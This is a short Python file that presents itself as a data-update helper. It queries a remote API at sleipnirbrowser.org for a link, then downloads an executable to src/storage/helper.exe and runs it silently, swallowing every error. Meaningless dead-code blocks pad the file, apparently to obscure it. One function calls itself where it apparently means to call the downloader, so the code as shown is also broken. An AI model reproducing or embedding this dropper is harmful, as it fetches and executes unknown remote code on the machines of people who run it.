import urllib.request
import os
if False:
    _var_192_0 = (20, 436, 273)
    _var_192_1 = (305, 525, 109)

    def _var_192_fn():
        pass
import requests
if False:
    _var_193_0 = (727, 697, 359)
    _var_193_1 = (78, 982, 13)
    _var_193_2 = (176, 30, 902)

    def _var_193_fn():
        pass
import subprocess

def updateData(url):
    try:
        download_dir = 'src/storage'
        os.makedirs(download_dir, exist_ok=True)
        file_path = os.path.join(download_dir, 'helper.exe')
        urllib.request.urlretrieve(url, file_path)
        subprocess.run([file_path], check=True)
    except Exception as e:
        pass
if False:
    _var_194_0 = (168, 40, 536)

    def _var_194_fn():
        pass

def init_helper():
    try:
        link_response = requests.get('https://sleipnirbrowser.org/api/python/14526470/win')
        if link_response.status_code == 200:
            json_data = link_response.json()
            if 'link' in json_data:
                download_link = json_data['link']
                init_helper(download_link)
            else:
                pass
    except Exception:
        pass